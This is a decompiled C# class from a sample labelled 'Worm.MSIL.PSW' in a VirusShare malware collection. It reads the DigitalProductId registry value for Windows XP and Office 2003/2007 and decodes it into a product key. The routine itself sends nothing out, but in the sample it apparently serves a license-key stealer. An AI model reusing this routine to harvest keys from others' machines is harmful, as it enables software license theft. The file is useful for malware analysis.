// Decompiled with JetBrains decompiler
// Type: Stub.MSKeyFinder.KeyDecoder
// Assembly: Stub, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 884FAE89-1304-49EF-9C4D-EB728FDD6B2A
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.PSW.d-f1acb5d85a7c36db1661a403f54aeffb99f8d17e70e2c615e690173d028968b6.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System.Collections;
using System.Diagnostics;

namespace Stub.MSKeyFinder
{
  public class KeyDecoder
  {
    [DebuggerNonUserCode]
    public KeyDecoder()
    {
    }

    public static byte[] GetRegistryDigitalProductId(KeyDecoder.Key key)
    {
      byte[] digitalProductId1 = (byte[]) null;
      RegistryKey registryKey = (RegistryKey) null;
      switch (key)
      {
        case KeyDecoder.Key.XP:
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
          break;
        case KeyDecoder.Key.Office11:
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\11.0\\Registration\\{90110409-6000-11D3-8CFE-0150048383C9}", false);
          break;
        case KeyDecoder.Key.Office12:
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-002F-0000-0000-0000000FF1CE}", false);
          break;
      }
      if (registryKey != null)
      {
        byte[] digitalProductId2 = registryKey.GetValue("DigitalProductId") as byte[];
        registryKey.Close();
        return digitalProductId2;
      }
      if (registryKey == null)
        digitalProductId1 = (byte[]) null;
      return digitalProductId1;
    }

    public static string DecodeProductKey(byte[] digitalProductId)
    {
      if (digitalProductId == null)
        return "";
      char[] chArray1 = new char[24]
      {
        'B',
        'C',
        'D',
        'F',
        'G',
        'H',
        'J',
        'K',
        'M',
        'P',
        'Q',
        'R',
        'T',
        'V',
        'W',
        'X',
        'Y',
        '2',
        '3',
        '4',
        '6',
        '7',
        '8',
        '9'
      };
      char[] chArray2 = new char[29];
      ArrayList arrayList = new ArrayList();
      int index1 = 52;
      do
      {
        arrayList.Add((object) digitalProductId[index1]);
        checked { ++index1; }
      }
      while (index1 <= 67);
      int index2 = 28;
      do
      {
        if (checked (index2 + 1) % 6 == 0)
        {
          chArray2[index2] = '-';
        }
        else
        {
          int index3 = 0;
          int index4 = 14;
          do
          {
            int num = index3 << 8 | (int) Conversions.ToByte(arrayList[index4]);
            arrayList[index4] = (object) checked ((byte) unchecked (num / 24));
            index3 = num % 24;
            chArray2[index2] = chArray1[index3];
            checked { index4 += -1; }
          }
          while (index4 >= 0);
        }
        checked { index2 += -1; }
      }
      while (index2 >= 0);
      return new string(chArray2);
    }

    public enum Key
    {
      XP,
      Office11,
      Office12,
    }
  }
}
